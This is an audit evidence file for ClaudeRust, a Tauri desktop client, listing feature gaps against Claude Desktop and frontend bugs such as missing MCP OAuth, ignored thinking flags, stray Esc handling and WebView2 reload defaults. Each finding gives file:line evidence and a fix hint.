# Denetim 1 — tam kanıtlar (2026-11-21)

PROJECT_PROGRESS.md backlog'unun kanıt dosyası: her madde için dosya:satır kanıtı ve düzeltme ipucu. Denetim 1, beş bağımsız uzman tarafından yapıldı (kararlılık, ön yüz/IPC, performans, derleme/test, Claude Desktop paritesi).

## Claude Desktop paritesi

Ölçümler: Sources read: D:\ClaudeRust README.md and CHANGELOG.md in full, plus targeted reads and greps of src-tauri/src (claudecode.rs, mcp.rs, engine.rs, prompts.rs, models.rs, attachments.rs, artifacts.rs, extensions.rs, slash.rs, lib.rs, settings.rs, commands.rs command list), Cargo.toml, tauri.conf.json and ui/js (composer.js, chat.js, settings.js, slash.js, artifacts.js, usage_ui.js, quick.js, sidebar.js, i18n.js, util.js, onboarding.js, code.js, panes/preview.js). For Claude Desktop 6.18355.0.0 (Electron 45.3.3, C:\Program Files\WindowsApps\Claude_6.18355.0.0_x64__pzs8sxrjxfjjc, read only): I read AppxManifest.xml (claude:// protocol, startup task) and the app/resources listing (cowork-svc.exe, claude-ssh-*.exe, chrome-native-host.exe, smol-bin.x64.vhdx). I parsed the app.asar (1240 files) and ion-dist.asar (6692 files) headers with a scratch Python script and extracted ion-dist /i18n/en-US.json (3.4 MB string table) to C:\Users\xldyt\AppData\Local\Temp\claude\b19ddb4b09d05f83\747baec6-ad7e-4440-baa9-57ceec9c11a3\scratchpad\asar\en-US.json, then grepped it per feature. I grepped the printable strings of the Claude Code CLI at C:\Users\xldyt\.local\bin\claude.exe for flags (--thinking, --fast-mode, --mcp-config), rate_limit_event, AskUserQuestion and control subtypes. First-hand evidence also comes from the tool schemas Desktop's Code tab gives this very session (ccd_window, ccd_pr, ccd_session, ccd_session_mgmt, ccd_host, ccd_sidebar, Claude_Browser, scheduled-tasks). Labelled from memory: only the window.claude.complete API name in FP-13. Areas I found at parity or better and did not list: streaming, edit/retry/branch and fork, retry with another model, paste and drag-drop, Markdown/LaTeX/tables, export (MD/JSON/HTML), search, projects (instructions and files), styles, profile, per-tool MCP permissions, MCP prompts/resources in the composer, model picker and effort, Quick Entry, tray, global shortcut, autostart, notifications, auto-update, theme, zoom, onboarding, and Code tab diff review, terminal, worktrees, checkpoints/rewind, PR creation and routines.

Kontrol edilmeyenler: I did not run cargo check, clippy, test or npm run lint: build health belongs to another auditor and my items do not depend on it. I did not launch ClaudeRust or Claude Desktop, so nothing was verified at runtime or by screenshot, and the Desktop comparison rests on the string table, the file listing and the host tool schemas. Consequences: for FP-03 I did not observe what the CLI returns when AskUserQuestion is approved without answers, and I did not confirm that image attachments in Claude-account chats reach the model. Desktop's JS bundles were not decompiled; I only grepped strings. Features that need a claude.ai account (share links, publishing artifacts, the connector directory, Research, Claude in Chrome, computer use, Dispatch) were left out of the backlog on purpose, except where a local equivalent is possible (FP-07). I also did not check the CLI version number (taken from the task as 2.1.326) or release/updater packaging, beyond noting that the public repo has no published release yet (gh release list returned nothing).

### FP-01 — Chats on the Claude-account engine (the onboarding default) run with web search, MCP connectors, past-chat search and project PDFs/images off, but the UI still shows those controls

- Önem: **high**, efor: **M**
- Dosyalar: `src-tauri/src/claudecode.rs`, `src-tauri/src/engine.rs`, `ui/js/composer.js`
- Kanıt: onboarding.js:60 saves chat_engine:'claude-code' when the user picks their Claude subscription. claudecode.rs:789-807 then forces options.web_search=false and chat_search=false, and passes --tools "" --strict-mcp-config --setting-sources "" to the CLI. Its own comment at :793 says "shortcut: no web search or memory search in these chats". Only rc.system is written to a file (:798-800). rc.prefix_blocks, which hold the project's PDF and image knowledge files (engine.rs:122-134), are never sent, and the MCP tool list is dropped. composer.js:350-353 still shows the Web search switch in chat mode and :360-370 shows per-MCP-server switches, with no engine check, so the 'Web search' chip (composer.js:108-110) can be on while Claude cannot search. In Desktop, web search and connectors work in every chat (i18n strings 'Web search', 'Turn on web search', 'Add connector'; 858 connector strings).
- Düzeltme ipucu: In the chat branch, enable the CLI's own tools: --tools WebSearch,WebFetch, plus --allowedTools when web_search is on. Write the enabled ClaudeRust MCP servers to a temp file and pass it with --mcp-config. Prepend rc.prefix_blocks to the first user line's content. Where a feature really cannot run, hide or disable its toggle for claude-code chats.

### FP-02 — The Extended thinking switch does nothing on the Claude Code engine (chats and code sessions)

- Önem: **high**, efor: **S**
- Dosyalar: `src-tauri/src/claudecode.rs`, `ui/js/composer.js`
- Kanıt: composer.js:309-311 shows the 'Extended thinking' switch for any model that supports it and saves options.thinking, whatever the engine. cli_session_flags (claudecode.rs:564-574) passes only --effort and --settings (ultracode), and claudecode.rs has no 'thinking' reference anywhere (grep: 0 hits). The CLI binary has '--thinking <mode>' with choices enabled|adaptive|disabled, and '--max-thinking-tokens'. Turning thinking off has no effect, and neither does turning it on when the CLI's settings disable it.
- Düzeltme ipucu: In cli_session_flags, map options.thinking (when set) to --thinking enabled or disabled, and add a unit test next to the existing flag logic.

### FP-03 — Claude's questions (AskUserQuestion) cannot be answered in Code sessions; other CLI dialog requests are rejected

- Önem: **high**, efor: **M**
- Dosyalar: `src-tauri/src/claudecode.rs`, `ui/js/chat.js`, `ui/js/parts.js`
- Kanıt: 'AskUserQuestion' appears nowhere in the repo (grep over all non-target files: 0 hits). A can_use_tool request for it goes down the generic path in claudecode.rs:1248-1295. chat.js:872-876 then renders it as 'wants to use AskUserQuestion' with the raw JSON input and Allow once / Allow for session / Deny buttons, so there is no way to pick an option. Every other control_request subtype is answered with {subtype:'error', error:'Not supported by ClaudeRust'} (claudecode.rs:1296-1297). The CLI's strings show it sends request_user_dialog and 'elicitation', and expects AskUserQuestion answers in updatedInput ('ask_user_question_unanswered_v1', 'The host reported that nobody answered the question'). Desktop renders these as choice cards ('Claude is asking you to choose between options.', 'Claude is asking: {name} Choose an option to respond.').
- Düzeltme ipucu: Special-case tool_name=='AskUserQuestion' in the can_use_tool branch: emit a 'question' kind and render the questions/options as buttons plus a free-text field. Reply with behavior:'allow' and updatedInput {questions, answers}. Never let 'allow for session' auto-approve it.

### FP-04 — No OAuth and no 'Add custom connector' flow for remote MCP servers; any server that needs sign-in fails with HTTP 401

- Önem: **high**, efor: **L**
- Dosyalar: `src-tauri/src/mcp.rs`, `ui/js/settings.js`, `src-tauri/src/commands.rs`
- Kanıt: mcp.rs:1068-1087: a remote server gets only the static 'headers' from the config. mcp.rs:409-413: any non-success status, 401 included, becomes 'MCP HTTP 401: …'. There is no WWW-Authenticate, metadata discovery, dynamic client registration, PKCE or token storage anywhere (grep 'oauth' in src-tauri/src: 0 hits). The only way to add a server is the raw JSON editor (settings.js:303, 569-591), whose example tells users to paste a Bearer token (:580). Desktop has 'Add custom connector', 'Or add a custom connector by URL', 'OAuth client', 'Client ID', 'Client secret', 'OAuth sign-in' (i18n en-US.json). Most hosted MCP servers (Linear, Notion, Atlassian, GitHub remote, ...) require OAuth.
- Düzeltme ipucu: Implement MCP authorization: on 401, read the protected-resource metadata, do dynamic client registration and authorization code + PKCE through a loopback redirect, keep tokens in the OS keyring (secrets.rs) and refresh them. Add an 'Add connector (URL)' form with optional client ID/secret and a 'Connect' button on the server card.

### FP-05 — MCP servers configured in ClaudeRust are missing from Claude Code engine sessions (the default code engine)

- Önem: **high**, efor: **M**
- Dosyalar: `src-tauri/src/claudecode.rs`, `src-tauri/src/mcp.rs`
- Kanıt: claudecode.rs:957 'let mcp: HashMap<String,(String,String)> = HashMap::new();' and no --mcp-config is passed for code sessions (only --strict-mcp-config for chats at :803). The built-in engine does add ClaudeRust's MCP tools (engine.rs:156-173). A server added under Settings → Developer therefore shows in the composer's MCP menu (composer.js:360-370) but the CLI session never sees it. The CLI accepts '--mcp-config' (flag list in claude.exe strings). Claude Desktop hands its own connectors to Code sessions: this audit session, which runs in Desktop's Code tab, has Desktop-provided servers such as scheduled-tasks, Claude_Browser and computer-use.
- Düzeltme ipucu: Write the enabled, non-disabled servers from claude_desktop_config.json, with the conversation's disabled_servers removed, to a per-session JSON file and pass --mcp-config <file>. Fill the 'mcp' name map so the tool cards show friendly names.

### FP-06 — Chat cannot read spreadsheets or presentations and cannot create files (no code execution / file creation)

- Önem: **high**, efor: **M**
- Dosyalar: `src-tauri/src/attachments.rs`, `src-tauri/src/models.rs`, `src-tauri/src/engine.rs`, `ui/js/artifacts.js`
- Kanıt: attachments.rs:219-234 handles only images, PDF, .docx (as text) and text files. A .xlsx or .pptx is refused with '“{name}” isn't a supported file type. You can attach images, PDFs, Word documents and text files.' models.rs:314-326 adds only web_search/web_fetch server tools and never code_execution, even though render.rs already renders code_execution results (test fixture render.rs:1139-1140). Desktop has 'Code execution and file creation', 'Create files and execute code', 'Editable .xlsx spreadsheet', 'Failed to load Excel file', and a file viewer for generated files (app.asar: /.vite/renderer/file_viewer/assets/word-*.js, slides-*.js).
- Düzeltme ipucu: Behind a setting, add the code_execution server tool for first-party API chats. Upload xlsx/pptx/csv through the Files API as container_upload blocks. Fetch generated files through the Files API into a download card. For the CLI engine, at minimum extract xlsx/pptx text the way .docx is handled now.

### FP-07 — Desktop's Cowork mode (autonomous non-coding agent in a sandboxed workspace) has no equivalent

- Önem: **high**, efor: **L**
- Dosyalar: `ui/js/sidebar.js`, `src-tauri/src/engine.rs`, `src-tauri/src/codetools.rs`
- Kanıt: Current Desktop ships Cowork as a top-level mode next to Chat and Code: 318 'Cowork' strings ('Switch to Cowork and Claude will research, build, and keep going on its own.', 'Cowork tasks', 'Cowork files', 'Cowork memory'), plus app/resources/cowork-svc.exe and smol-bin.x64.vhdx (VM image) in the install. ClaudeRust's sidebar switch has only Chat and Code (README.md:164, sidebar.js:1).
- Düzeltme ipucu: A minimal version: a 'Task' mode that runs the existing built-in agent (codetools + web tools + MCP) in a chosen working folder with Auto permissions, a non-developer prompt, a files/outputs pane, and a background-task list. VM sandboxing can come later.

### FP-08 — No subscription usage-limit display: the CLI's rate_limit_event is dropped and the usage page only shows API cost

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/claudecode.rs`, `ui/js/usage_ui.js`, `ui/js/sidebar.js`
- Kanıt: The stream-json dispatch in claudecode.rs:1141-1320 handles system, stream_event, assistant, control_request, control_cancel_request, control_response and result, and has no arm for 'rate_limit_event' (grep 'rate_limit' finds only anthropic.rs:519 and parts.js:385, both API 429s). claude.exe contains 'rate_limit_event', 'resetsAt' and 'rate_limit_event with invalid rate_limit_info'. usage_ui.js:1 is 'Usage dashboard: tokens and cost', which means nothing on a flat-rate plan. Desktop: 'Plan usage limits', 'Usage limit reached', 'Resets at {time}', 'Weekly limit'.
- Düzeltme ipucu: Parse rate_limit_event (status, rateLimitType, resetsAt, utilization), keep the latest one in AppState, show a meter and reset time in the account menu and on /usage, and warn when the limit is close.

### FP-09 — No chat memory (synthesized, editable, per-project) and no incognito chats

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/settings.rs`, `src-tauri/src/engine.rs`, `src-tauri/src/prompts.rs`, `ui/js/settings.js`, `ui/js/sidebar.js`
- Kanıt: Chat 'memory' is only the conversation_search/recent_chats tools behind settings.chat_search (settings.rs:52-53, engine.rs:139-141), and those are off for Claude-account chats (claudecode.rs:797). There is no stored memory summary or memory editor for chats: memory_ui.js:1 covers only CLAUDE.md for code sessions. grep 'incognito|temporary chat' in ui: 0 hits. Desktop: 'Memory on/off', 'View memory', 'Edit memory', 'Manage project memory', 'Claude regenerates project memory every evening from your past chats in this project', 'Import memory', 'New incognito chat'.
- Düzeltme ipucu: Keep a user-editable memory text (global and per project) in the DB, inject it like the profile block, and add a 'Remember this' / periodic summarize job with a fast model. Add an incognito flag that skips DB persistence and excludes the chat from search.

### FP-10 — 'Add screenshot' is a permanently disabled menu item; Quick Entry is text-only

- Önem: **medium**, efor: **M**
- Dosyalar: `ui/js/composer.js`, `ui/js/quick.js`, `ui/quick.html`, `src-tauri/src/lib.rs`, `src-tauri/src/commands.rs`
- Kanıt: composer.js:381: { label: t('add_screenshot'), icon: 'image', disabled: true }, a visible control that never works. quick.js is 43 lines and quick.html 17 lines, with no paste, attachment or capture handling (grep 'screenshot|capture|image|paste|attach': 0 hits). Desktop: 'Take a screenshot', 'Capture screenshot', 'Screenshot preview', 'Couldn’t attach the image from Quick Entry, so there was nothing to send.'
- Düzeltme ipucu: Add a capture command (screen or window, e.g. via the xcap crate) that stages a PNG through the existing stage_bytes path. Enable the menu item and add the same button and paste-image handling to Quick Entry. Until then, remove the dead item.

### FP-11 — No voice input (dictation) or read-aloud

- Önem: **medium**, efor: **M**
- Dosyalar: `ui/js/composer.js`, `ui/js/chat.js`, `ui/js/parts.js`
- Kanıt: grep 'dictat|speech|SpeechRecognition|microphone|getUserMedia|voice' in ui/js: 0 hits. Desktop: 'Dictation', 'Voice input', 'Voice mode', 'Listening for dictation…', 'Read aloud', 'Read Aloud couldn’t start.' README.md:65 lists voice mode as unsupported, but dictation and read-aloud do not need a claude.ai account.
- Düzeltme ipucu: Read aloud: a message action using window.speechSynthesis, which works in WebView2/WKWebView (size S). Dictation: a mic button on OS speech recognition (Windows.Media.SpeechRecognition via the windows crate, SFSpeechRecognizer on macOS), inserting text into the composer.

### FP-12 — Skills and plugins are absent: no discovery, no management UI, and the built-in engine and chats cannot use them

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/slash.rs`, `ui/js/slash.js`, `src-tauri/src/claudecode.rs`, `ui/js/settings.js`
- Kanıt: slash.rs:65-71 lists only <project>/.claude/commands and ~/.claude/commands. grep 'SKILL.md|.claude/skills|plugin|marketplace' in src-tauri/src and 'skill|plugin' in ui/js: 0 hits, so the '/' menu never offers skills and there is no Skills/Plugins settings page. Desktop: 544 skill strings ('Add skill', 'Ran skill') and 683 plugin strings ('Add plugin', 'All plugins').
- Düzeltme ipucu: For CLI sessions, read the skills and slash_commands lists from the stream-json system/init event into the '/' menu. For the built-in engine, index ~/.claude/skills and project .claude/skills (front matter name and description) and load SKILL.md on demand. Add a read-only Skills list in Settings.

### FP-13 — Artifacts lack AI-powered artifacts, persistent artifact storage, and 'Try fixing with Claude' for runtime errors

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/artifacts.rs`, `ui/js/artifacts.js`, `src-tauri/src/lib.rs`
- Kanıt: artifacts.rs:241-247: the ERROR_HOOK only paints the error inside the iframe and nothing sends it back. The panel header has only copy, download and close (artifacts.js:117-126). There is no host bridge for artifacts to call Claude or to store data (grep 'window.claude|window.storage|sendPrompt' in ui and src-tauri/src: 0 hits). Desktop: 'Try fixing with Claude', 'AI-powered artifacts', 'Read artifact data', 'Allow Claude to edit this artifact’s data?'. The window.claude.complete API name is from memory.
- Düzeltme ipucu: Have ERROR_HOOK postMessage the error to the parent, and show a 'Try fixing' button that sends a prompt with the error text. Add a postMessage bridge in artifact:// documents for a complete(prompt) call (routed through the current engine with a cost cap) and a key-value store per artifact in SQLite.

### FP-14 — Single main window: no 'Open in new window' and no split view

- Önem: **medium**, efor: **L**
- Dosyalar: `src-tauri/src/lib.rs`, `ui/js/main.js`, `ui/js/store.js`
- Kanıt: lib.rs builds only the 'main' window from tauri.conf.json and the 'quick' Quick Entry window (lib.rs:74-91), and lib.rs:329 treats every non-'main' window as secondary. There is no command to open a conversation in another window or pane. Desktop: 'New window', 'Open in new window', 'Open in split view', 'Focus next split view', 'Close split view'. Desktop's Code-tab host also exposes ccd_window open_session_in and close_split to this session.
- Düzeltme ipucu: Add an open_window(conversation_id) command that builds a labelled WebviewWindow loading index.html#conv=<id>, so the store and event listeners scope to one conversation. Split view can reuse that in one window with two chat views.

### FP-15 — Claude cannot see or operate the Code tab's Preview pane, so it cannot check its own UI changes

- Önem: **medium**, efor: **L**
- Dosyalar: `ui/js/panes/preview.js`, `src-tauri/src/codetools.rs`, `src-tauri/src/claudecode.rs`
- Kanıt: preview.js has no screenshot, DOM-read or eval path (grep 'screenshot|eval|tool': 0 hits), and the agent has no tool that targets the preview (codetools.rs 'preview' hits are only diff previews at :1261-1278). Desktop's Code tab gives Claude a drivable Browser pane: this session has the Desktop-provided mcp__Claude_Browser__preview_start / navigate / computer(screenshot, click) / read_page / read_console_messages tools.
- Düzeltme ipucu: Expose a small built-in MCP server (or built-in tools) backed by the preview webview: navigate, screenshot (WebView2 CapturePreview / WKWebView takeSnapshot), page text, console log and click by selector. Pass it to CLI sessions with --mcp-config.

### FP-16 — Pull requests end at creation: no CI/check status, review comments, or auto-merge

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/pullrequest.rs`, `ui/js/panes/changes.js`, `ui/js/panes/pr_util.js`
- Kanıt: pullrequest.rs covers only branch/compare URLs and creation (:29-37 compare_url, :223 PR URL detection), and grep 'checks|statusCheck|auto-merge' finds nothing. Desktop's Code-tab host exposes ccd_pr bind_pr, get_status, set_auto_merge and set_monitor to this session. Desktop strings: 'Auto-merge is on', 'Cancel auto-merge', 'Create PR'.
- Düzeltme ipucu: After creating or detecting a PR, poll 'gh pr view --json statusCheckRollup,reviewDecision,comments' and show it in the Changes pane, with 'Send failing checks to Claude' and 'Enable auto-merge' (gh pr merge --auto) actions.

### FP-17 — Code sessions are local only: no SSH hosts, cloud sessions or Remote Control

- Önem: **medium**, efor: **L**
- Dosyalar: `ui/js/code.js`, `src-tauri/src/claudecode.rs`, `src-tauri/src/terminal.rs`
- Kanıt: The Code page's environment row offers only engine, folder and worktree (code.js:27, 46-64), and grep for ssh/remote-control/cloud session finds nothing outside git transport comments. Desktop ships claude-ssh-broker.exe, claude-ssh-proxy.exe and claude-ssh-askpass.exe, with 460 SSH strings ('SSH host', 'SSH sessions') and 109 'Remote Control' strings. Its Code-tab host exposes ccd_session move_to_cloud and ccd_session_mgmt set_remote_control to this session.
- Düzeltme ipucu: Start with SSH: run the claude CLI on the remote host over ssh with stream-json on stdin/stdout (the protocol code stays the same), with a host picker and the existing permission cards. Cloud and Remote Control need claude.ai account features and can stay out of scope.

### FP-18 — Screen-reader support is minimal: no live regions for streaming answers, toasts or errors

- Önem: **medium**, efor: **M**
- Dosyalar: `ui/index.html`, `ui/js/chat.js`, `ui/js/util.js`, `ui/js/parts.js`
- Kanıt: aria-live appears only in the vendored xterm (ui/vendor/xterm/xterm.mjs), never in the app's own code. The whole UI has 21 aria-label attributes. The modal() helper (util.js ~line 210) sets role=dialog/aria-modal but has no Tab focus trap (0 'Tab' handling in the function). Streamed replies and errorToast() messages are therefore not announced. Desktop has accessibility-specific strings such as 'You can tab to its buttons and press Enter, make the window larger, or zoom out.'
- Düzeltme ipucu: Add role=log aria-live=polite to the message list (announce on turn end, not every token), role=status/alert on the toast container, a focus trap and focus return in modal(), and aria-labels on the title-only icon buttons.

### FP-19 — Desktop extensions can be installed but not uninstalled, reconfigured, updated or browsed

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/extensions.rs`, `src-tauri/src/commands.rs`, `ui/js/settings.js`
- Kanıt: The only extension commands are extension_inspect and extension_install (commands.rs command list; extensions.rs:44 inspect, :182 install). The Developer page has just an 'Install extension' file picker (settings.js:306), and the server card (settings.js:481-517) has no uninstall or settings action for extensions. Removing one means hand-editing the JSON. Desktop: 'Uninstall {name}', 'Remove extension', 'Extension settings', 'Browse extensions' (app.asar webStorePage.js, extensionWindow.js).
- Düzeltme ipucu: Record installed extensions (id, dir, manifest, user_config) and add extension_uninstall (remove the config entry and the folder) and extension_configure (re-render the user_config form with saved values) commands, with buttons on the server card.

### FP-20 — Session lists have star and delete only: no archive, no pinned code sessions, no unread markers

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/sidebar.js`, `ui/js/code.js`, `src-tauri/src/db.rs`
- Kanıt: sidebar.js:218-231 groups only starred and recent items, and grep 'archiv' in ui/js: 0 hits. Desktop: 'Archive all sessions?', 'Archive task', 'Pin session', 'Click to mark as unread', 'This will archive … sessions older than a week. Pinned sessions aren’t affected.'
- Düzeltme ipucu: Add an archived flag to conversations (filtered out of Recents, with an 'Archived' view) and an unread flag set when a turn finishes in a session that is not open.

### FP-21 — No fast mode toggle

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/claudecode.rs`, `ui/js/composer.js`, `src-tauri/src/models.rs`
- Kanıt: grep 'fast_mode|fast mode' in models.rs, claudecode.rs and composer.js: 0 hits. The CLI accepts '--fast-mode <on|off>' (claude.exe strings). Desktop: 'Toggle fast mode', 'Fast mode on', 'Claude Code fast mode'.
- Düzeltme ipucu: Add a fast-mode switch to the model menu for models that support it and pass --fast-mode on|off in cli_session_flags.

### FP-22 — No 'keep computer awake' while agents, workflows or routines run

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/engine.rs`, `src-tauri/src/claudecode.rs`, `src-tauri/src/routines.rs`, `ui/js/settings.js`
- Kanıt: grep 'keep.awake|SetThreadExecutionState|prevent.*sleep' in src-tauri/src and ui/js: 0 hits, so a long run or a scheduled routine dies when the PC sleeps. Desktop: 'Keep computer awake while Claude works', 'Prevents sleep while Dispatch is running.' Its host also exposes ccd_host request_keep_awake to this session.
- Düzeltme ipucu: Hold a sleep inhibitor (SetThreadExecutionState(ES_SYSTEM_REQUIRED) on Windows, caffeinate/IOPMAssertion on macOS, or the keepawake crate) while any turn or routine is running, behind a setting.

### FP-23 — No URL protocol handler (deep links)

- Önem: **low**, efor: **M**
- Dosyalar: `src-tauri/Cargo.toml`, `src-tauri/tauri.conf.json`, `src-tauri/src/lib.rs`
- Kanıt: Cargo.toml:21-30 has no tauri-plugin-deep-link and tauri.conf.json has no protocol entry. The only custom scheme is the internal artifact:// protocol (lib.rs:265). Desktop registers claude:// (AppxManifest.xml: <uap3:Protocol Name="claude">) and uses it for links from websites and connector sign-ins ('Finish claude.ai connector (MCP) sign-ins in the browser rather than letting the app finish them from a claude:// link').
- Düzeltme ipucu: Add tauri-plugin-deep-link with an app scheme (not 'claude', to avoid hijacking Desktop) for 'open chat', 'new chat with prompt' and MCP OAuth redirects (see FP-04), routed through the single-instance plugin that is already there.

### FP-24 — MCP tools/list_changed notifications are ignored, so a server's new tools appear only after a manual Reload

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/mcp.rs`
- Kanıt: mcp.rs:1038-1051: a server message with a method but no id (a notification) is dropped with 'return'. The HTTP transport never opens the GET event stream, so it cannot receive notifications either. Tools are fetched only in initialize/refresh_tools (mcp.rs:541-591).
- Düzeltme ipucu: In handle_stdout_line, treat 'notifications/tools/list_changed' (and prompts/resources) as a trigger to call refresh_tools and emit 'mcp-changed'. Do the same for the HTTP transport through its SSE stream.

### FP-25 — Only two interface languages (English, Turkish) against Desktop's eleven

- Önem: **low**, efor: **M**
- Dosyalar: `ui/js/i18n.js`
- Kanıt: i18n.js:1242 has 'const dicts = { en, tr };' and LANGUAGES at :1259-1262 lists only en and tr. Desktop's ion-dist.asar ships i18n for de-DE, en-US, es-419, es-ES, fr-FR, hi-IN, id-ID, it-IT, ja-JP, ko-KR and pt-BR.
- Düzeltme ipucu: Move the dictionaries to per-language JSON files loaded on demand, then add the major locales, starting with the strings a new user sees: onboarding, composer, settings.

## Frontend / IPC

Ölçümler: IPC (scratchpad ipc_check.mjs, espree AST): 161 commands in generate_handler, 161 #[tauri::command] fns. 237 JS call() sites with literal names: 0 unregistered commands, 0 unknown argument keys, 0 missing required keys (camelCase to snake_case checked against Rust params; Option params treated as optional). The 2 dynamic-argument sites (suggest.js:58-59) were checked by hand and are correct. Registered but never called from JS: delete_artifact, worktree_commit, term_list, dev_report, code_info. Events: Rust emits 28 event names and every one has a JS listener. JS listens to 31; the 3 extra are tauri://drag-*. Payload keys spot-checked (term-*, watch-status, hooks-untrusted, cc-waiting, compacted, notice, quick-entry, *-progress) and they match. Permission decision strings match engine.rs, claudecode.rs and subagent.rs. i18n (i18n_check.mjs): en 888 / tr 888 keys, 0 missing either way, 0 static t() keys missing. 24 dynamic t() families checked against Rust value sets (MCP statuses, context categories, weekdays 1-7, modes, efforts): all present. About 28 en keys look unused. npm run lint: clean. HTML sink scan (html_scan.mjs): 152 flagged interpolations reviewed, 1 real (FE-19). turnstream JS decoder against the Rust encoder fixture: 383 events, 368 equal, 15 expected nulls, 0 mismatches. Contrast computed: --text-3 3.59 (light) / 3.50 (dark), white on dark --danger 2.70. Scripts are in C:\Users\xldyt\AppData\Local\Temp\claude\b19ddb4b09d05f83\747baec6-ad7e-4440-baa9-57ceec9c11a3\scratchpad (ipc_check.mjs, i18n_check.mjs, html_scan.mjs, ts_check.mjs, t_check.mjs).

Kontrol edilmeyenler: I did not launch the app. No runtime RAM, DOM-size or FPS measurement, no real window-resize or small-window screenshots, and no screen-reader pass. The WebView2 reload/context-menu behaviour (FE-04) is inferred from the wry/Tauri source defaults, not observed. I did not run the full cargo check/clippy/test, only the ignored turnstream fixture test. Rust backend logic was not audited beyond what the UI consumes (markdown sanitization, list payloads, term_open, MCP auth grep). I did not verify how Tauri handles window.open from the artifact iframe (sandbox includes allow-popups-to-escape-sandbox), nor WKWebView/WebKitGTK differences (for example window.prompt on macOS). Turkish string quality, onboarding, importer, routines, rewind and usage pages were only skimmed.

### FE-01 — Remote MCP servers have no OAuth sign-in, so Claude Desktop-style custom connectors cannot connect

- Önem: **high**, efor: **L**
- Dosyalar: `src-tauri/src/mcp.rs`, `ui/js/settings.js`
- Kanıt: `grep -ic oauth src-tauri/src/mcp.rs` returns 0. Remote transport only sends static headers (mcp.rs:74, 278-290: `headers: Vec<(String,String)>`). There is no `notifications/tools/list_changed` handling either (grep finds only cancelled/initialized/message). A server that answers 401 just shows as `failed` with the error text (settings.js:481-494); there is no Connect or Authenticate button. Claude Desktop's custom connectors sign in with OAuth. (Mostly backend; it surfaces in the MCP settings UI.)
- Düzeltme ipucu: Implement the MCP authorization flow (401 + WWW-Authenticate -> metadata discovery -> PKCE in the system browser -> token stored in the keyring -> refresh). Show an 'Authenticate' button on the server card when status is needs_auth. Re-list tools on tools/list_changed.

### FE-02 — Long conversations: no virtualization, collapsed tool cards keep their full output in the DOM, and the whole rendered conversation is re-fetched after every turn

- Önem: **medium**, efor: **L**
- Dosyalar: `ui/js/parts.js`, `ui/js/chat.js`, `ui/css/app.css`, `src-tauri/src/commands.rs`
- Kanıt: renderTool always builds the full body, collapsed or not: parts.js:337-338 sets innerHTML with toolBody(p), which holds `<pre>${esc(r.text)}</pre>` (parts.js:232, 269-287). Results can be up to 40 000 chars each (render.rs:291) and Write content up to 20 000 (parts.js:277). Every turn stays in the DOM, and app.css has no `content-visibility`/`contain` rule. After every turn end, edit, branch switch and retry, reload() fetches get_conversation, which returns the entire rendered conversation (chat.js:300-318, 826-828; commands.rs:379-383, whose comment says rendering 'can take seconds'). A 300-tool session keeps megabytes of hidden text in the DOM and re-sends it over IPC after every answer.
- Düzeltme ipucu: Render a tool body only on first expand (keep the part data on el.__part). Add `.turn{content-visibility:auto;contain-intrinsic-size:auto 400px}`. Have get_conversation take a 'since'/tail window, or let reload() fetch only turns whose snapshot changed, and lazy-load older turns when scrolling up.

### FE-03 — Esc anywhere outside a modal stops the running turn, including in side-pane inputs and when dismissing the quote bar

- Önem: **medium**, efor: **S**
- Dosyalar: `ui/js/main.js`, `ui/js/composer.js`
- Kanıt: main.js:168-172: `else if (e.key === 'Escape' && !document.querySelector('.modal-scrim, .popover')) { ... if (c && c.running && !c.composer.waiting()) { e.preventDefault(); chat.stopTurn(c.id); } }`. It checks neither the focused element nor e.defaultPrevented. Esc in the Files filter, History search, Preview URL or Map filter inputs (none of them handle Esc), or Esc to hide the selection quote bar (quote.js:81), stops Claude mid-run. Esc in the composer is already handled at composer.js:447-450, and the event then bubbles to this handler, so stop_generation is sent twice.
- Düzeltme ipucu: Remove the global handler and rely on the composer's own Esc. Or limit it to focus inside .chat-scroll/.chat-bottom/body and return early when e.defaultPrevented.

### FE-04 — WebView2 browser defaults leak into the app: F5 / Ctrl+R / right-click 'Refresh' reload the whole UI, losing queued messages and orphaning terminal PTYs

- Önem: **medium**, efor: **M**
- Dosyalar: `ui/js/main.js`, `ui/js/panes/terminal.js`, `src-tauri/src/lib.rs`
- Kanıt: wry-0.57.3 src/lib.rs:1770-1771 defaults to `browser_accelerator_keys: true` and `default_context_menus: true` ('WebView2's default behavior'). tauri-runtime-wry-2.12.5 and tauri-2.12.7 never override them (grep finds nothing). The UI has no global `contextmenu` handler (the only one is panes/map.js:103) and does not block F5/Ctrl+R/Ctrl+P. So right-click shows Back/Refresh/Save as/Print, and Ctrl+R outside the composer reloads the page. After a reload, the in-memory queue is gone (chat.js:783 `const queues = new Map()`). The terminal pane opens a new PTY (terminal.js:37-43 -> commands.rs:1545-1558 always opens a new one). `term_list` is registered but never called from JS, so the old shells keep running unseen until the app exits.
- Düzeltme ipucu: In main.js, preventDefault on `contextmenu` (keep it for inputs/selection with a small Copy/Paste/Select-all menu via showMenu), and on F5, Ctrl/Cmd+R, Ctrl+Shift+R and Ctrl+P. On terminal mount, call term_list and reattach existing PTYs.

### FE-05 — Stale route renders: Project and Sessions pages can overwrite the view after you have already navigated elsewhere

- Önem: **medium**, efor: **S**
- Dosyalar: `ui/js/projects.js`, `ui/js/code.js`, `ui/js/main.js`
- Kanıt: navigate() checks its token only for 'chat' (main.js:83-84). renderProject awaits get_project and then sets `view.innerHTML` (projects.js:62-66). renderSessions awaits list_conversations and then sets `view.innerHTML` (code.js:119-121). Neither checks whether it is still current, unlike renderCode, which has `stale()` (code.js:13-21). Example: open a project, then press Ctrl+Shift+O (new chat, rendered synchronously) or click a fast-loading chat. The project page replaces it while store.route says 'new'/'chat', and `cur` points at a detached chat DOM.
- Düzeltme ipucu: Pass navToken (or a stale() closure) into the render functions and return before touching `view` when it changed, as renderCode does.

### FE-06 — Esc on a nested dialog closes every stacked modal, the bottom one first (for example Settings closes with the confirm)

- Önem: **medium**, efor: **S**
- Dosyalar: `ui/js/util.js`
